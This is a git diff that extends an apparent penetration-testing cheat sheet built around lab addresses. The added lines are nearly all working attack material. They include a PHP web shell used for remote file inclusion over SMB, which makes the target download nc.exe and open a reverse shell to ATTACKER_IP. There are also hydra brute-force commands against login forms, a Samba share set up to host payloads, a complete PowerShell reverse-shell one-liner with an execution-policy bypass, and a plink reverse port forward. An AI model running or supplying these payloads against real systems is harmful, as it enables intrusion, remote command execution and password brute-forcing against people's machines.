@@ -566,6 +566,14 @@ Content of evil.txt:
 # PHP Filter:
 http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config
 
+# RFI over SMB (Windows)
+cat php_cmd.php
+	<?php echo shell_exec($_GET['cmd']);?>
+- Start SMB Server in attacker machine and put evil script
+- Access it via browser (2 request attack):
+	- http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
+	- http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234
+
 ```
 
 
@@ -640,11 +648,16 @@ hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V
 # SIMPLE LOGIN GET
 hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V
 
+# GET FORM with HTTPS
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.111 -s 443 -S https-get-form "/index.php:login=^USER^&password=^PASS^:Incorrect login/password\!"
+
 # SIMPLE LOGIN POST
 hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I
 
 # API REST LOGIN POST
 hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64
+
+
 ```
 
 Online crackers
@@ -1340,9 +1353,36 @@ ftp -v -n -s:ftp.txt
 # Attack machine
 python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111"
 
+	# Or SMB service 
+	# http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
+	vim /etc/samba/smb.conf
+		[global]
+		workgroup = WORKGROUP
+		server string = Samba Server %v
+		netbios name = indishell-lab
+		security = user
+		map to guest = bad user
+		name resolve order = bcast host
+		dns proxy = no
+		bind interfaces only = yes
+	
+		[ica]
+		path = /var/www/html/pub
+		writable = no
+		guest ok = yes
+		guest only = yes
+		read only = yes
+		directory mode = 0555
+		force user = nobody
+
+	chmod -R 777 smb_path
+	chown -R nobody:nobody smb_path
+	service smbd restart 
+
 # Victim machine with reverse shell
 Download: copy \\10.11.1.111\Lab\wce.exe . 
 Upload: copy wtf.jpg \\10.11.1.111\Lab
+
 ```
 
 ### Windows download with VBS
@@ -1463,6 +1503,16 @@ echo $credential = New-Object System.Management.Automation.PSCredential $usernam
 echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
 ```
 
+#### Powershell Reverse Shell
+
+```powershell
+Set-ExecutionPolicy Bypass
+
+$client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+
+
 ### Windows privesc/enum tools
 
 - [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
@@ -1472,6 +1522,14 @@ echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $cr
 ### Windows precompiled exploits
 
 - [WindowsExploits](https://github.com/abatchy17/WindowsExploits)
+
+### Windows Port Forwarding
+
+Run in victim (5985 WinRM):
+
+`plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221`
+
+ 
 
 # **Loot**
 
